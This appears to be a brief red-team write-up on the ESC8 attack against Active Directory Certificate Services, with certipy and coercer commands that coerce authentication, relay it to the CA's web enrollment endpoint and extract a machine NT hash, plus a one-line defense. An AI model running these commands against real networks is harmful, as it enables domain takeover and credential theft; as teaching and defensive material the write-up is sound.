# ESC8: NTLM Relay to Certificate Authority

## Why NTLM Still Haunts Us

ESC8 exploits a simple chain: coerce a machine to authenticate to you, relay that authentication to the CA's HTTP enrollment endpoint, and walk away with a certificate for that machine account.

### Why It Works

HTTP doesn't enforce NTLM signing. When you relay authentication to `http://CA-server/certsrv/`, the CA issues a certificate thinking it's a legitimate request. That certificate gets you a TGT, which gets you the machine's NT hash.

### The Attack

**1. Start relay listener pointing at CA:**
```bash
certipy relay -target <CA-IP> -template DomainController
```

**2. Force target to auth to you:**
```bash
coercer coerce -l <YOUR-IP> -t <TARGET-IP> -u user -p pass
```

**3. Extract hash from certificate:**
```bash
certipy auth -pfx certificate.pfx
```

**4. DCSync the domain or forge a Silver Ticket**

### Requirements

- Web enrollment enabled on CA
- Certificate template allowing machine enrollment + client authentication (default Machine/DomainController templates)

### Impact

Compromise ANY machine you can coerce authentication from. If you coerce a DC, you own the domain.

### Defense

Disable web enrollment or enforce EPA/channel binding on the HTTP endpoint.

---

**Verdict:** Elegant, devastating, surprisingly common in the wild.

<img width="1176" height="319" alt="image" src="https://github.com/user-attachments/assets/4dff9496-d8ab-4e21-a6d6-8727cf306bec" />

